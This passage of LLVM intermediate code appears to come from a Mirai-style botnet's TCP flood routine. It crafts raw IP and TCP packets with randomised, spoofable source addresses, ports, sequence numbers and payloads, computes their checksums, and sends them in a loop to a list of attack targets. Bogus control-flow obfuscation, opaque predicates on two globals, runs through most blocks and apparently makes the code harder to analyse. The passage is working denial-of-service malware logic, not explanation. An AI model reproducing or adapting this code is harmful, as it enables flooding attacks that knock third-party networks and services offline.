  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %696

; <label>:141:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %142 = load i32, i32* %18, align 4
  %143 = bitcast i32* %17 to i8*
  %144 = call i32 @setsockopt(i32 %142, i32 0, i32 3, i8* %143, i32 4) #6
  %145 = icmp eq i32 %144, -1
  br i1 %145, label %146, label %149

; <label>:146:                                    ; preds = %141
  %147 = load i32, i32* %18, align 4
  %148 = call i32 @close(i32 %147)
  br label %696

; <label>:149:                                    ; preds = %141
  store i32 0, i32* %17, align 4
  br label %150

; <label>:150:                                    ; preds = %originalBBpart2215, %149
  %151 = load i32, i32* %17, align 4
  %152 = load i8, i8* %13, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp slt i32 %151, %153
  br i1 %154, label %155, label %360

; <label>:155:                                    ; preds = %150
  %156 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %157 = load i8**, i8*** %19, align 8
  %158 = load i32, i32* %17, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds i8*, i8** %157, i64 %159
  store i8* %156, i8** %160, align 8
  %161 = load i8**, i8*** %19, align 8
  %162 = load i32, i32* %17, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i8*, i8** %161, i64 %163
  %165 = load i8*, i8** %164, align 8
  %166 = bitcast i8* %165 to %struct.iphdr*
  store %struct.iphdr* %166, %struct.iphdr** %37, align 8
  %167 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i64 1
  %169 = bitcast %struct.iphdr* %168 to %struct.tcphdr*
  store %struct.tcphdr* %169, %struct.tcphdr** %38, align 8
  %170 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i64 1
  %172 = bitcast %struct.tcphdr* %171 to i8*
  store i8* %172, i8** %39, align 8
  %173 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = load i8, i8* %174, align 4
  %176 = and i8 %175, 15
  %177 = or i8 %176, 64
  store i8 %177, i8* %174, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, -16
  %182 = or i8 %181, 5
  store i8 %182, i8* %179, align 4
  %183 = load i8, i8* %20, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 1
  store i8 %183, i8* %185, align 1
  %186 = load i32, i32* %34, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 40, %187
  %189 = trunc i64 %188 to i16
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 2
  store i16 %190, i16* %192, align 2
  %193 = load i16, i16* %21, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 3
  store i16 %194, i16* %196, align 4
  %197 = load i8, i8* %22, align 1
  %198 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 5
  store i8 %197, i8* %199, align 4
  %200 = load i8, i8* %23, align 1
  %201 = icmp ne i8 %200, 0
  br i1 %201, label %202, label %222

; <label>:202:                                    ; preds = %155
  %203 = load i32, i32* @x.27
  %204 = load i32, i32* @y.28
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %202
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* @x.27
  %215 = load i32, i32* @y.28
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %222

; <label>:222:                                    ; preds = %originalBBpart28, %155
  %223 = load i32, i32* @x.27
  %224 = load i32, i32* @y.28
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %222
  %231 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 6
  store i8 6, i8* %232, align 1
  %233 = load i32, i32* %36, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 8
  store i32 %233, i32* %235, align 4
  %236 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %237 = load i32, i32* %17, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %236, i64 %238
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i32 0, i32 1
  %241 = load i32, i32* %240, align 4
  %242 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 9
  store i32 %241, i32* %243, align 4
  %244 = load i16, i16* %24, align 2
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 0
  store i16 %245, i16* %247, align 4
  %248 = load i16, i16* %25, align 2
  %249 = call zeroext i16 @htons(i16 zeroext %248) #7
  %250 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 1
  store i16 %249, i16* %251, align 2
  %252 = load i32, i32* %26, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #7
  %255 = zext i16 %254 to i32
  %256 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 2
  store i32 %255, i32* %257, align 4
  %258 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %260, -241
  %262 = or i16 %261, 80
  store i16 %262, i16* %259, align 4
  %263 = load i8, i8* %28, align 1
  %264 = sext i8 %263 to i16
  %265 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %266 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %265, i32 0, i32 4
  %267 = load i16, i16* %266, align 4
  %268 = and i16 %264, 1
  %269 = shl i16 %268, 13
  %270 = and i16 %267, -8193
  %271 = or i16 %270, %269
  store i16 %271, i16* %266, align 4
  %272 = load i8, i8* %29, align 1
  %273 = sext i8 %272 to i16
  %274 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = and i16 %273, 1
  %278 = shl i16 %277, 12
  %279 = and i16 %276, -4097
  %280 = or i16 %279, %278
  store i16 %280, i16* %275, align 4
  %281 = load i8, i8* %30, align 1
  %282 = sext i8 %281 to i16
  %283 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %284 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %283, i32 0, i32 4
  %285 = load i16, i16* %284, align 4
  %286 = and i16 %282, 1
  %287 = shl i16 %286, 11
  %288 = and i16 %285, -2049
  %289 = or i16 %288, %287
  store i16 %289, i16* %284, align 4
  %290 = load i8, i8* %31, align 1
  %291 = sext i8 %290 to i16
  %292 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = and i16 %291, 1
  %296 = shl i16 %295, 10
  %297 = and i16 %294, -1025
  %298 = or i16 %297, %296
  store i16 %298, i16* %293, align 4
  %299 = load i8, i8* %32, align 1
  %300 = sext i8 %299 to i16
  %301 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 4
  %303 = load i16, i16* %302, align 4
  %304 = and i16 %300, 1
  %305 = shl i16 %304, 9
  %306 = and i16 %303, -513
  %307 = or i16 %306, %305
  store i16 %307, i16* %302, align 4
  %308 = load i8, i8* %33, align 1
  %309 = sext i8 %308 to i16
  %310 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 4
  %312 = load i16, i16* %311, align 4
  %313 = and i16 %309, 1
  %314 = shl i16 %313, 8
  %315 = and i16 %312, -257
  %316 = or i16 %315, %314
  store i16 %316, i16* %311, align 4
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 5
  store i16 %319, i16* %321, align 2
  %322 = load i8, i8* %30, align 1
  %323 = icmp ne i8 %322, 0
  %324 = load i32, i32* @x.27
  %325 = load i32, i32* @y.28
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBBpart2203, label %originalBB10alteredBB

originalBBpart2203:                               ; preds = %originalBB10
  br i1 %323, label %332, label %338

; <label>:332:                                    ; preds = %originalBBpart2203
  %333 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 4
  %335 = load i16, i16* %334, align 4
  %336 = and i16 %335, -2049
  %337 = or i16 %336, 2048
  store i16 %337, i16* %334, align 4
  br label %338

; <label>:338:                                    ; preds = %332, %originalBBpart2203
  %339 = load i8*, i8** %39, align 8
  %340 = load i32, i32* %34, align 4
  call void @rand_str(i8* %339, i32 %340)
  br label %341

; <label>:341:                                    ; preds = %338
  %342 = load i32, i32* @x.27
  %343 = load i32, i32* @y.28
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB205, label %originalBB205alteredBB

originalBB205:                                    ; preds = %originalBB205alteredBB, %341
  %350 = load i32, i32* %17, align 4
  %351 = add nsw i32 %350, 1
  store i32 %351, i32* %17, align 4
  %352 = load i32, i32* @x.27
  %353 = load i32, i32* @y.28
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart2215, label %originalBB205alteredBB

originalBBpart2215:                               ; preds = %originalBB205
  br label %150

; <label>:360:                                    ; preds = %150
  br label %361

; <label>:361:                                    ; preds = %originalBBpart2299, %360
  %362 = load i32, i32* @x.27
  %363 = load i32, i32* @y.28
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %361
  store i32 0, i32* %17, align 4
  %370 = load i32, i32* @x.27
  %371 = load i32, i32* @y.28
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  br label %378

; <label>:378:                                    ; preds = %676, %originalBBpart2219
  %379 = load i32, i32* @x.27
  %380 = load i32, i32* @y.28
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBB221, label %originalBB221alteredBB

originalBB221:                                    ; preds = %originalBB221alteredBB, %378
  %387 = load i32, i32* %17, align 4
  %388 = load i8, i8* %13, align 1
  %389 = zext i8 %388 to i32
  %390 = icmp slt i32 %387, %389
  %391 = load i32, i32* @x.27
  %392 = load i32, i32* @y.28
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart2223, label %originalBB221alteredBB

originalBBpart2223:                               ; preds = %originalBB221
  br i1 %390, label %399, label %679

; <label>:399:                                    ; preds = %originalBBpart2223
  %400 = load i8**, i8*** %19, align 8
  %401 = load i32, i32* %17, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds i8*, i8** %400, i64 %402
  %404 = load i8*, i8** %403, align 8
  store i8* %404, i8** %40, align 8
  %405 = load i8*, i8** %40, align 8
  %406 = bitcast i8* %405 to %struct.iphdr*
  store %struct.iphdr* %406, %struct.iphdr** %41, align 8
  %407 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i64 1
  %409 = bitcast %struct.iphdr* %408 to %struct.tcphdr*
  store %struct.tcphdr* %409, %struct.tcphdr** %42, align 8
  %410 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i64 1
  %412 = bitcast %struct.tcphdr* %411 to i8*
  store i8* %412, i8** %43, align 8
  %413 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %414 = load i32, i32* %17, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i32 0, i32 2
  %418 = load i8, i8* %417, align 4
  %419 = zext i8 %418 to i32
  %420 = icmp slt i32 %419, 32
  br i1 %420, label %421, label %458

; <label>:421:                                    ; preds = %399
  %422 = load i32, i32* @x.27
  %423 = load i32, i32* @y.28
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB225, label %originalBB225alteredBB

originalBB225:                                    ; preds = %originalBB225alteredBB, %421
  %430 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %431 = load i32, i32* %17, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i64 %432
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %433, i32 0, i32 1
  %435 = load i32, i32* %434, align 4
  %436 = call i32 @ntohl(i32 %435) #7
  %437 = call i32 @rand_next()
  %438 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %439 = load i32, i32* %17, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %438, i64 %440
  %442 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i32 0, i32 2
  %443 = load i8, i8* %442, align 4
  %444 = zext i8 %443 to i32
  %445 = lshr i32 %437, %444
  %446 = add i32 %436, %445
  %447 = call i32 @htonl(i32 %446) #7
  %448 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 9
  store i32 %447, i32* %449, align 4
  %450 = load i32, i32* @x.27
  %451 = load i32, i32* @y.28
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBBpart2232, label %originalBB225alteredBB

originalBBpart2232:                               ; preds = %originalBB225
  br label %458

; <label>:458:                                    ; preds = %originalBBpart2232, %399
  %459 = load i32, i32* %36, align 4
  %460 = icmp eq i32 %459, -1
  br i1 %460, label %461, label %481

; <label>:461:                                    ; preds = %458
  %462 = load i32, i32* @x.27
  %463 = load i32, i32* @y.28
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %461
  %470 = call i32 @rand_next()
  %471 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 8
  store i32 %470, i32* %472, align 4
  %473 = load i32, i32* @x.27
  %474 = load i32, i32* @y.28
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br label %481

; <label>:481:                                    ; preds = %originalBBpart2236, %458
  %482 = load i16, i16* %21, align 2
  %483 = zext i16 %482 to i32
  %484 = icmp eq i32 %483, 65535
  br i1 %484, label %485, label %491

; <label>:485:                                    ; preds = %481
  %486 = call i32 @rand_next()
  %487 = and i32 %486, 65535
  %488 = trunc i32 %487 to i16
  %489 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 3
  store i16 %488, i16* %490, align 4
  br label %491

; <label>:491:                                    ; preds = %485, %481
  %492 = load i32, i32* @x.27
  %493 = load i32, i32* @y.28
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %491
  %500 = load i16, i16* %24, align 2
  %501 = zext i16 %500 to i32
  %502 = icmp eq i32 %501, 65535
  %503 = load i32, i32* @x.27
  %504 = load i32, i32* @y.28
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br i1 %502, label %511, label %533

; <label>:511:                                    ; preds = %originalBBpart2240
  %512 = load i32, i32* @x.27
  %513 = load i32, i32* @y.28
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %511
  %520 = call i32 @rand_next()
  %521 = and i32 %520, 65535
  %522 = trunc i32 %521 to i16
  %523 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 0
  store i16 %522, i16* %524, align 4
  %525 = load i32, i32* @x.27
  %526 = load i32, i32* @y.28
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart2258, label %originalBB242alteredBB

originalBBpart2258:                               ; preds = %originalBB242
  br label %533

; <label>:533:                                    ; preds = %originalBBpart2258, %originalBBpart2240
  %534 = load i16, i16* %25, align 2
  %535 = zext i16 %534 to i32
  %536 = icmp eq i32 %535, 65535
  br i1 %536, label %537, label %559

; <label>:537:                                    ; preds = %533
  %538 = load i32, i32* @x.27
  %539 = load i32, i32* @y.28
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBB260, label %originalBB260alteredBB

originalBB260:                                    ; preds = %originalBB260alteredBB, %537
  %546 = call i32 @rand_next()
  %547 = and i32 %546, 65535
  %548 = trunc i32 %547 to i16
  %549 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 1
  store i16 %548, i16* %550, align 2
  %551 = load i32, i32* @x.27
  %552 = load i32, i32* @y.28
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart2272, label %originalBB260alteredBB

originalBBpart2272:                               ; preds = %originalBB260
  br label %559

; <label>:559:                                    ; preds = %originalBBpart2272, %533
  %560 = load i32, i32* %26, align 4
  %561 = icmp eq i32 %560, 65535
  br i1 %561, label %562, label %566

; <label>:562:                                    ; preds = %559
  %563 = call i32 @rand_next()
  %564 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 2
  store i32 %563, i32* %565, align 4
  br label %566

; <label>:566:                                    ; preds = %562, %559
  %567 = load i32, i32* @x.27
  %568 = load i32, i32* @y.28
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %566
  %575 = load i32, i32* %27, align 4
  %576 = icmp eq i32 %575, 65535
  %577 = load i32, i32* @x.27
  %578 = load i32, i32* @y.28
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br i1 %576, label %585, label %589

; <label>:585:                                    ; preds = %originalBBpart2276
  %586 = call i32 @rand_next()
  %587 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 3
  store i32 %586, i32* %588, align 4
  br label %589

; <label>:589:                                    ; preds = %585, %originalBBpart2276
  %590 = load i8, i8* %35, align 1
  %591 = icmp ne i8 %590, 0
  br i1 %591, label %592, label %611

; <label>:592:                                    ; preds = %589
  %593 = load i32, i32* @x.27
  %594 = load i32, i32* @y.28
  %595 = sub i32 %593, 1
  %596 = mul i32 %593, %595
  %597 = urem i32 %596, 2
  %598 = icmp eq i32 %597, 0
  %599 = icmp slt i32 %594, 10
  %600 = or i1 %598, %599
  br i1 %600, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %592
  %601 = load i8*, i8** %43, align 8
  %602 = load i32, i32* %34, align 4
  call void @rand_str(i8* %601, i32 %602)
  %603 = load i32, i32* @x.27
  %604 = load i32, i32* @y.28
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br label %611

; <label>:611:                                    ; preds = %originalBBpart2280, %589
  %612 = load i32, i32* @x.27
  %613 = load i32, i32* @y.28
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %611
  %620 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %621 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %620, i32 0, i32 7
  store i16 0, i16* %621, align 2
  %622 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %623 = bitcast %struct.iphdr* %622 to i16*
  %624 = call zeroext i16 @checksum_generic(i16* %623, i32 20)
  %625 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %626 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %625, i32 0, i32 7
  store i16 %624, i16* %626, align 2
  %627 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %628 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %627, i32 0, i32 6
  store i16 0, i16* %628, align 4
  %629 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %630 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %631 = bitcast %struct.tcphdr* %630 to i8*
  %632 = load i32, i32* %34, align 4
  %633 = sext i32 %632 to i64
  %634 = add i64 20, %633
  %635 = trunc i64 %634 to i16
  %636 = call zeroext i16 @htons(i16 zeroext %635) #7
  %637 = load i32, i32* %34, align 4
  %638 = sext i32 %637 to i64
  %639 = add i64 20, %638
  %640 = trunc i64 %639 to i32
  %641 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %629, i8* %631, i16 zeroext %636, i32 %640)
  %642 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %643 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %642, i32 0, i32 6
  store i16 %641, i16* %643, align 4
  %644 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %645 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %644, i32 0, i32 1
  %646 = load i16, i16* %645, align 2
  %647 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %648 = load i32, i32* %17, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %647, i64 %649
  %651 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %650, i32 0, i32 0
  %652 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %651, i32 0, i32 1
  store i16 %646, i16* %652, align 2
  %653 = load i32, i32* %18, align 4
  %654 = load i8*, i8** %40, align 8
  %655 = load i32, i32* %34, align 4
  %656 = sext i32 %655 to i64
  %657 = add i64 40, %656
  %658 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %659 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %660 = load i32, i32* %17, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %659, i64 %661
  %663 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %662, i32 0, i32 0
  %664 = bitcast %struct.sockaddr_in* %663 to %struct.sockaddr*
  store %struct.sockaddr* %664, %struct.sockaddr** %658, align 8
  %665 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %666 = load %struct.sockaddr*, %struct.sockaddr** %665, align 8
  %667 = call i64 @sendto(i32 %653, i8* %654, i64 %657, i32 16384, %struct.sockaddr* %666, i32 16)
  %668 = load i32, i32* @x.27
  %669 = load i32, i32* @y.28
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBBpart2295, label %originalBB282alteredBB

originalBBpart2295:                               ; preds = %originalBB282
  br label %676

; <label>:676:                                    ; preds = %originalBBpart2295
  %677 = load i32, i32* %17, align 4
  %678 = add nsw i32 %677, 1
  store i32 %678, i32* %17, align 4
  br label %378

; <label>:679:                                    ; preds = %originalBBpart2223
  %680 = load i32, i32* @x.27
  %681 = load i32, i32* @y.28
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
